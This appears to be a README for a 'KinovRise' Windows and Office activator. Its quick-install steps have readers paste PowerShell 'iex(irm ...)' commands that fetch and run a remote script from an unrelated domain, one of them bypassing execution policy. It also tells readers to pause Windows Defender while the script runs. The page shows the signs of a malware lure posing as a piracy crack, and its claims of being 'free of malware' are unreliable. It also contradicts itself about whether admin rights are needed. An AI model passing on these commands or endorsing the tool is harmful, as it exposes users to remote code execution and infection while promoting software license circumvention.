<div align="center">

# KinovRise Activator Script for Windows 10 & 11

![preview](https://raw.githubusercontent.com/nomantasleem124-commits/kinovrise-multi-machine-activation-script/main/shot_846f9c.svg)

[![checks](https://img.shields.io/badge/CHECKS-PASSING-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-CORE-ec4899?style=for-the-badge&labelColor=0d1117)]() [![state](https://img.shields.io/badge/STATE-RELEASED-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![lang](https://img.shields.io/badge/LANG-PYTHON-f472b6?style=for-the-badge&labelColor=0d1117)]()

</div>

---

KinovRise-Activator-KRA- is a script-driven utility for activating Windows and Office quickly and free of charge, built to handle multi-computer activation without fuss. The automation keeps the workflow short: launch it, let the script do the heavy lifting, and move on. It is designed with safety in mind, with no malware bundled into the process. This README covers how the activation works and what to expect from the 180-day license renewal cycle.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Launch PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Run the install command
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Windows blocking the script? Use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## What it does

KinovRise handles the activation workflow for Windows and Office from a single entry point, so you don't have to juggle separate tools or walk through license dialogs by hand. It targets both the OS and the Office suite, and it's built to work across multiple machines rather than being tied to one install.

What that means in practice:

- **One-shot activation** — point it at a machine and it applies the relevant license for Windows and/or Office without manual key entry.
- **Multi-computer friendly** — the same script can be run on several systems, which makes it useful for labs, test benches, or small fleets where doing this by hand gets old fast.
- **Free and script-driven** — no paid tier, no account gate. Run it, let it work, move on.
- **Lightweight footprint** — it's a script, not an installer stack. It does its job and doesn't leave a bunch of services running afterward.
- **Renewal-aware** — activations are time-limited and the client re-checks with the KinovRise server to keep them valid. If a renewal doesn't land, reactivation is a rerun away.
- **Troubleshooter path** — when a standard activation fails, the built-in troubleshooter steps in to reapply the license instead of leaving you at a dead end.

The intended flow is: run it, let it apply the license, confirm the result. If something doesn't take, rerun or hit the troubleshooter. Configuration options exist for cases where you need to scope what gets activated — see the Configuration section for those.

## Configuration

KinovRise runs with a small set of defaults so it works out of the box. The options below are the ones you'll actually touch when tuning behavior for a single machine or a batch of them.

**Activation mode**
By default the script targets both Windows and Office on the local machine. You can restrict it to one target when you don't want the other touched — useful on machines where Office is managed separately.

**License renewal window**
Activations are valid for 180 days and renew automatically while the client can reach the KinovRise service. If a machine stays offline past that window, it needs to be reactivated. Plan for this on air-gapped or long-offline systems.

**Multi-computer rollout**
For fleets, run the same configuration on each machine rather than editing per-host. Keep a single known-good configuration and deploy it unchanged; per-machine tweaks make troubleshooting harder when one host behaves differently.

**Troubleshooter fallback**
If activation fails, the built-in troubleshooter re-applies the KinovRise license for Windows. Leave this enabled unless you have a specific reason to disable it — it's the first thing to reach for when a machine reports an activation error.

**Logging and verbosity**
Increase verbosity when diagnosing a failed activation, then drop back to default for normal runs. Verbose output is noisy and not needed once things work.

**Configuration hygiene**
Keep your configuration file (or command-line flags) under version control if you manage more than a couple of machines. Note the KinovRise version alongside it — behavior can shift between releases, and matching config to version saves time later.

## Examples

The examples below show the common ways people run KinovRise in practice. Pick the one that matches your environment — single machine, a batch of computers, or a quick re-check after a failed activation.

**Single machine, one-shot run**

Launch the activator with administrator rights and let it auto-detect what's installed. This is the path most users take on a personal PC: it activates Windows and Office in one pass without extra flags.

**Silent / unattended activation**

For scripted setups, run the activator in non-interactive mode so it returns an exit code you can branch on. Typical pattern:

- Run the tool elevated.
- Pass the silent flag (or equivalent in your build).
- Check the exit code: `0` on success, non-zero on failure.
- Log stdout/stderr to a file for later review.

Wrap it in your provisioning script so a failed activation doesn't abort the rest of the setup.

**Multi-computer rollout**

When activating a lab, office, or test fleet:

- Keep a single copy of the activator on shared storage or a deployment share.
- Trigger it from your remote-execution tool of choice (scheduled task, remote shell, or your config-management agent).
- Run machines in small batches and collect exit codes centrally.
- Re-run only the machines that failed, rather than the whole fleet.

**Re-activation after the 180-day window**

If a machine's license lapses, re-run the activator the same way you first ran it. No special flags are needed — the standard run refreshes the license. Confirm success via the exit code before moving on.

**Troubleshooting a failed activation**

If activation fails partway:

- Re-run elevated; permission issues are the most common cause.
- Use the Troubleshooter option to clear the existing state and retry.
- Capture the output and compare against a machine that activated successfully.

**Verifying the result**

After any run, confirm the license state from the OS itself (activation status in system settings, or the relevant Office account page). Treat the activator's exit code as a signal, not proof — always verify on the target machine.

## FAQ

- **Do I need to keep anything running after activation?** No. Once the activation completes, the license is in place. Just make sure the machine can reach the KinovRise renewal service before the 180-day window closes so it renews automatically.

- **Activation failed — what now?** Run the built-in Troubleshooter to reapply the KinovRise license to Windows, then retry. Most failures come from an already-active conflicting license or a blocked connection; clearing the old key first usually resolves it.

- **Can I activate more than one computer?** Yes. KinovRise is built for multi-machine activation — run it on each target machine the same way. No per-seat juggling required.

- **Is this safe / does it install malware?** The project is designed to be safe and free of malware. Still, treat any activation tool with normal caution: run it from an administrator account you trust and keep your system updates current.

- **Which Windows and Office versions are supported?** Support varies by build and edition. Check the Supported/Unsupported list in the project before running so you don't waste a cycle on an unsupported target.

- **The 180-day license expired — do I have to start over?** No. Reactivate using the same steps; renewal normally happens automatically via the client, and a manual reactivation covers the case where the machine was offline past the deadline.

- **Does it need administrator rights?** Yes. Activation touches system licensing, so run PowerShell or the executable elevated. Without admin rights the script will fail silently or partially.

- **Why does it ask to connect to a server?** The KinovRise service handles license renewal after the initial 180 days. If that connection is blocked, activation still works but auto-renewal won't — plan to reactivate manually.

- **Can I undo the activation?** You can remove the applied license through standard Windows/Office licensing tools if needed. Do this before switching to a retail key to avoid conflicts.

- **Where do I report a bug or ask for help?** Use the project's issue tracker and include your Windows/Office version, the exact step that failed, and any error output — that's what makes a fix possible.

## Disclaimer

Use this script at your own risk. KinovRise is provided as-is, with no guarantees that activation will succeed on every build, edition, or configuration, and no warranty of any kind. You are responsible for how you run it and for the systems you run it on.

Activation behavior can change. Updates, policy changes, or server-side adjustments may break the script or shorten the effective activation period, and the 180-day renewal cycle depends on the client reaching the KinovRise server. If renewal fails, expect to reactivate manually.

Run it only on machines you own or are authorized to administer. Multi-computer activation is a convenience feature, not a license to deploy on systems you do not control. Review what the script does before executing it, prefer running from a controlled environment, and keep your own backups and recovery options in place.

Nothing here grants you rights you do not already have. You are responsible for complying with the licensing terms that apply to your Windows and Office installations and with the laws in your jurisdiction. The project authors and contributors accept no liability for data loss, system instability, blocked updates, or any other damage arising from use of this script.